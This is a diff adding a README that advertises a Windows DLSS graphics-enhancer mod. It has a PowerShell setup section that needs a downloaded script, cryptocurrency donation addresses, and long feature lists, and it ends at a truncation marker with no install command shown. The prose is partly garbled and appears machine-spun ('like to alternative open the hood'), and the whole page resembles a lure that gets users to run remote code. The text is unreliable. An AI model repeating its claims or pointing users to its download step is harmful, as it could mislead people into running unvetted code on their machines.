@@ -1,0 +1,91 @@
+Madaren Dlss5 Enhancer — Next-Level Visuals for Windows Mod
+
+🖥️ PowerShell Setup
+
+Keep the project growing
+
+BTC:&nbsp;1Nyw66BiR6xbYPjJTW1V1zzMV1omLD8vuT | TRON:&nbsp;TCfUYYXycDf9hzref5Fpjx8DFsPxoCko5K | ETH:&nbsp;0x40E6a032Cf0cC7885e4F62B5673aF8C4Da38b823
+
+Madaren Dlss5 Enhancer reshapes the visual backbone of madaren-DLSS5-Enhancer, trading raw performance for a sharper, more deliberate image pipeline that respects the original art direction. Every shader tweak and buffer adjustment here was born from late-night testing sessions and a stubborn refusal to accept muddy upscaling. Built for modders who like to alternative open the hood, the settings are exposed, the logic is documented, and nothing is locked behind a black box. Drop it in, tune it to your rig, and let the frames speak for themselves.
+
+✅ Requirements
+
+- OS: Windows 10 / 11
+- Shell: PowerShell 5.1+ or PowerShell 7+
+- Network: internet access to download the script
+- Privileges: standard user
+
+Features
+
+Madaren Dlss5 Enhancer doesn't just flip a switch — it rewires the whole visual pipeline for the world you actually play in.
+
+- Tuned DLSS5 profile — a hand-crafted preset that swaps the stock scaling curve for one built around motion clarity and crisp distant detail, so your horizon stays sharp instead of smearing into soup.
+- Per-scene sharpening — upscaling artifacts get caught at the source. Fine geometry, foliage edges, and small text stay legible without the crunchy over-sharpened halo you know too well.
+- Ghosting suppression — fast pans and quick camera snaps leave less trailing behind. Vehicles, cloth, and particle effects hold their shape when the action gets frantic.
+- Adaptive frame pacing — the enhancer reads your frametime behavior and nudges the preset so smoothness wins over raw numbers on weaker rigs, while beefier setups get the quality-first path.
+- Preset library — Balanced, Quality, and Cinematic modes ship ready to go, each a self-contained configuration you can drop into your load order and tweak without touching the core files.
+- Modder-friendly structure — every tuning value lives in a clean, commented config. Override individual stages, stack your own tweaks on top, or fork a preset without breaking the module. The enhancer plays nicely with the rest of your mod stack and won't fight your load management.
+- In-game toggle hook — enable or disable enhancement stages on the fly, so you can A/B the difference mid-session and see exactly what the mod is doing for your image.
+- Safe defaults, loud feedback — invalid or conflicting values get flagged in the log with plain-language notes, so you know what to fix instead of silently staring at a broken frame.
+- No black boxes — the whole thing is documented, every knob exposed. If you can read a config, you can re-aim this enhancer at your exact build, and the community is welcome to bend it further.
+
+How It Works
+
+Madaren Dlss5 Enhancer slips between your game's render pipeline and the DLSS 5 runtime like a well-placed shunt. It watches the frame as it leaves the engine, inspects the depth and motion vectors handed off for upscaling, and gently reworks the inputs before the temporal pass begins—sharpening the guidance signals, trimming the noise that fools the network, and keeping the reconstruction honest where the base implementation sometimes smears or ghosts.
+
+At its core, the enhancer runs a lightweight correction layer: it profiles the scene each frame (static or chaotic, bright or dim, fast pan or crawl), then dials DLSS 5's internal parameters to match. Static shots get crisper accumulation; motion-heavy scenes get tighter clamping so trails don't bloom. It also patches the handshake between the game's DLSS integration and the runtime, filling in the small mismatches that cause flicker, shimmer, or soft edges on distant geometry.
+
+Nothing gets replaced wholesale—the enhancer rides alongside the existing DLSS 5 path, nudging and reconciling rather than overriding. That means your game's own presets still matter, and the enhancer simply makes them behave closer to how the artists intended. Tweak the config, watch the frame budget, and enjoy the view.
+
+Modules and Settings
+
+Preset and Profile Selection
+This module bundles upscaling, frame generation and sharpening choices into named configurations so a whole look can be swapped in one step instead of adjusted setting by setting.
+- Choose a quality-focused or performance-focused profile to change several related options together, which is useful when comparing two overall setups in the same scene.
+- Assign a profile to a specific game so that title reloads with its own combination of upscaling and frame-generation behavior.
+- Review and reselect stored profiles to return to a configuration you previously found satisfactory.
+
+Upscaling Mode Adjustment
+This module controls which DLSS upscaling tier is active, letting users override the mode a game would otherwise default to where the game and driver permit it.
+- Select among the common quality-to-performance tiers to trade image sharpness against frame rate.
+- Override a game's default upscaling choice and observe the effect on the same scene without reinstalling the title.
+- Changes take effect on the next rendered frame, so comparisons stay within the running session.
+
+Frame Generation Controls
+This module manages frame generation separately from upscaling, so the two can be evaluated independently.
+- Enable or disable frame generation on its own while leaving the upscaling mode untouched.
+- Adjust related frame-generation toggles to isolate which setting affects perceived smoothness or input response.
+- Judge results in motion during gameplay, since the effect is not visible in static menus.
+
+Sharpness and Image Filtering
+This module applies sharpening and related filtering on top of the upscaled image to tune edge clarity and detail rendering.
+- Raise or lower the sharpening amount to counter softness or avoid over-sharpened edges.
+- Compare the effect on text, foliage and fine geometry at the same resolution to find a balanced setting.
+- Combine filtering adjustments with a chosen upscaling mode, since the filtering acts on whatever upscaled output is produced.
+
+Runtime Toggle and Comparison
+This module lets settings be switched on and off while a game is running for direct before-and-after comparison.
+- Toggle the enhancer's adjustments during play to see the same view with and without the changes.
+- Use the immediate rendering change to judge whether a sharpness or frame-generation adjustment actually improves the scene.
+- Compare without restarting the session, keeping experimentation quick and reversible.
+
+Compatibility and Safety Indicators
+This module reports whether the detected game and graphics setup match the conditions the enhancer expects for its adjustments.
+- See when a title or driver combination is recognized and when a configuration may not apply.
+- Receive an explicit indication for unrecognized setups rather than settings being applied silently.
+- Distinguish between results caused by the mod's changes and the game's native behavior.
+
+Additional Settings
+- Per-game configuration storage keeps each title's profile, upscaling mode, frame-generation state and sharpening amount separate from other games.
+- Configuration review shows which setup is currently active for a game and allows reverting to a previously saved one.
+- Profile persistence restores the saved combination automatically when that game is launched through the mod.
+- Comparison-friendly toggling preferences let frequently checked options be switched quickly during a session.
+
+Usage Scenarios
+
+Comparing Quality and Performance Profiles in a Demanding Title
+Goal: Decide whether a quality-focused or performance-focused configuration looks better in a specific game without manually adjusting every setting.
+Steps:
+1. Assign a quality-focused profile to the game in the Preset and Profile Selection module.
+
+…（内容已截断）
